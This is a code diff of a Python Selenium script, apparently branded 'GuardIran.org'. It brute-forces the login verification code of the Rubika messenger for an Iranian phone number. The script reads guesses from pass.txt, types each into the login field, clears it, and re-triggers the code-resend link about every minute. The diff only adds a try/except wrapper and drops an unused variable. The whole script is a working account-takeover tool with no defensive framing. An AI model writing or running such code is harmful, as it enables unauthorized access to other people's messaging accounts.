@@ -8,7 +8,7 @@ def Rubika():
     with open('./run.py','w') as writed:
         writed.write(new_file_)
     def CLEAR():
-        Clear_Cls=print(font('GuardIran.org'))
+        print(font('GuardIran.org'))
     os_INFO=platform.uname()
     if 'Windows' in os_INFO:
         os.system('cls')
@@ -27,15 +27,18 @@ def Rubika():
     time.sleep(4)
     stop=time.time()+61
     with open('./pass.txt','r') as passlist:
-        for i in passlist.read().split():
-            if stop<=time.time():
-                stop=time.time()+62
-                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[3]/p/a/span').click()
-                time.sleep(.1)
-                print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')
+        try:
+            for i in passlist.read().split():
+                if stop<=time.time():
+                    stop=time.time()+62
+                    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[3]/p/a/span').click()
+                    time.sleep(.1)
+                    print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')
 
-            print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
-            #drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').click()
-            drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').send_keys(str(i))
-            drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').clear()
+                print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
+                #drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').click()
+                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').send_keys(str(i))
+                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').clear()
+        except:
+            pass
 Rubika()
